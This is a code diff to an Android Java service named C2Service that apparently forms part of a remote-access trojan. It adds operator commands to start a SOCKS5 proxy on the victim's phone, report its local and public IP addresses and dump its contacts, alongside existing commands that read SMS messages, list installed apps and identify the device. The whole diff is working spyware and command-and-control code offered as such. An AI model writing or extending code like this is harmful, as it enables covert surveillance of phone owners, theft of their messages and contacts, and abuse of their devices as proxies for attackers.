@@ -21,12 +21,15 @@ public class C2Service extends Service {
     private BufferedReader reader;
     private volatile boolean running = true;
     private String deviceId;
+    private ProxyService proxyService;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
         deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
+        proxyService = new ProxyService();
+        proxyService.onCreate();
         Log.d("C2Service", "Service Created");
     }
 
@@ -78,13 +81,40 @@ public class C2Service extends Service {
     }
 
     private String executeCmd(String cmd) {
+        // PROXY COMMANDS
+        if (cmd.equalsIgnoreCase("proxy on")) {
+            proxyService.startProxy();
+            return "✅ SOCKS5 proxy started on port 1080";
+        }
+        if (cmd.equalsIgnoreCase("proxy off")) {
+            proxyService.stopProxy();
+            return "❌ Proxy stopped";
+        }
+        if (cmd.equalsIgnoreCase("proxy status")) {
+            return proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
+        }
+
+        // IP COMMANDS
+        if (cmd.equalsIgnoreCase("ip")) {
+            return DeviceInfo.getFullIpInfo(this);
+        }
+        if (cmd.equalsIgnoreCase("localip")) {
+            return "Local IP: " + DeviceInfo.getDeviceIp();
+        }
+        if (cmd.equalsIgnoreCase("publicip")) {
+            return "External IP: " + DeviceInfo.getPublicIp();
+        }
+
+        // EXISTING COMMANDS
         if (cmd.equalsIgnoreCase("ping")) return "PONG";
         if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
         if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
         if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getApps(this);
+        if (cmd.equalsIgnoreCase("contacts")) return DeviceInfo.getContacts(this);
         if (cmd.equalsIgnoreCase("device")) return deviceId;
         if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }
-        return "Unknown command";
+
+        return "Unknown command. Available: ping, info, ip, localip, publicip, sms read, contacts, apps list, device, proxy on/off/status, exit";
     }
 
     private void createNotificationChannel() {
@@ -108,6 +138,7 @@ public class C2Service extends Service {
     @Override
     public void onDestroy() {
         running = false;
+        if (proxyService != null) proxyService.stopProxy();
         try { socket.close(); } catch (Exception ignored) {}
         super.onDestroy();
     }
